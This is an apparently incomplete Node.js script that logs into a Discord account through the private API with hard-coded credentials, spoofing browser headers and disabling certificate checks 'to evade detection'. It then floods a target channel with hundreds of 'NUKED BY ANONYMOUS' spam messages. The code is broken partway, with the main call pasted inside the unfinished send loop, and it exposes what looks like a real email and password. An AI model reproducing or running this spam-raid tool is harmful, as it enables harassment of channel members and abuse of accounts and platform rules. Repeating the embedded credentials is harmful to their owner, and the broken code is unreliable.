const axios = require("axios");
const https = require("https");
const FormData = require("form-data");
const { WebSocket } = require("ws");
const qs = require("querystring");
// 🛡️ EVADE DETECTION WITH CUSTOM HTTPS AGENT  
const agent = new https.Agent({  
  rejectUnauthorized: false,  
  keepAlive: true,  
  timeout: 5000,  
  maxSockets: Infinity,  
});  

// 🎭 SPOOF USER-AGENT & SUPER PROPERTIES (CRITICAL FOR LOGIN)  
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";  
const X_SUPER_PROPERTIES = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDQyNywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=";  
async function loginWithCredentials(email, password) {  
  const form = new FormData();  
  form.append("login", email);  
  form.append("password", password);  

  try {  
    const response = await axios.post(  
      "https://discord.com/api/v9/auth/login",  
      form,  
      {  
        headers: {  
          ...form.getHeaders(),  
          "User-Agent": USER_AGENT,  
          "X-Super-Properties": X_SUPER_PROPERTIES,  
          "Content-Type": "multipart/form-data",  
        },  
        httpsAgent: agent,  
      }  
    );  

    const { token, user_id } = response.data;  
    console.log(`[🔑] LOGIN SUCCESSFUL | TOKEN: ${token.slice(0, 15)}...`);  
    return token;  
  } catch (e) {  
    console.error(`[🔥] LOGIN FAILED: ${e.response?.data || e.message}`);  
    throw e;  
  }  
}  
async function connectWebSocket(token) {  
  const ws = new WebSocket("wss://gateway.discord.gg/?v=9&encoding=json");  

  ws.on("open", () => {  
    console.log("[⚡] WEBSOCKET CONNECTED");  
    ws.send(JSON.stringify({  
      op: 2,  
      d: {  
        token,  
        properties: { $os: "windows", $browser: "chrome", $device: "" },  
      },  
    }));  
  });  

  ws.on("message", (data) => {  
    const payload = JSON.parse(data);  
    if (payload.t === "MESSAGE_CREATE") {  
      console.log(`[📨] MESSAGE RECEIVED: ${payload.d.content}`);  
    }  
  });  

  return ws;  
}  
async function nukeChannel(token, channelId, messageCount = 1000) {  
  let success = 0;  
  let fails = 0;  

  const spamMessages = Array.from({ length: messageCount }, (_, i) => ({  
    content: `💣 NUKED BY ANONYMOUS [${i + 1}] ${Date.now()}`,  
    tts: false,  
  }));  

  for (const msg of spamMessages) {  
    try {  
      await axios.post(  
        `https://discord.com/api/v9/channels/${channelId}/messages`,  
        msg,  
        {  
          headers: {  
            Authorization: token,  
            "User-Agent": USER_AGENT,  
          },  
          httpsAgent: agent,  
        }  
      );  
      success++;  
      console.log(`[💀] MESSAGE ${success} SENT`);
      (async () => {  
  try {  
    const EMAIL = "imadsmina106@gmail.com"; // 🔴 REPLACE  
    const PASSWORD = "uhexfcmctd"; // 🔴 REPLACE  
    const CHANNEL_ID = "123456789012345678"; // 🔴 TARGET CHANNEL  

    console.log("[🔐] LOGGING IN...");  
    const token = await loginWithCredentials(EMAIL, PASSWORD);  

    console.log("[⚙️] CONNECTING WEBSOCKET...");  
    await connectWebSocket(token);  

    console.log("[💥] STARTING CHANNEL NUKE...");  
    await nukeChannel(token, CHANNEL_ID, 500); // 500 MESSAGES  

    console.log("[🎉] NUKE COMPLETE!");  
  } catch (e) {  
    console.error(`[💀] FATAL ERROR: ${e.message}`);  
  }  
})();  
    
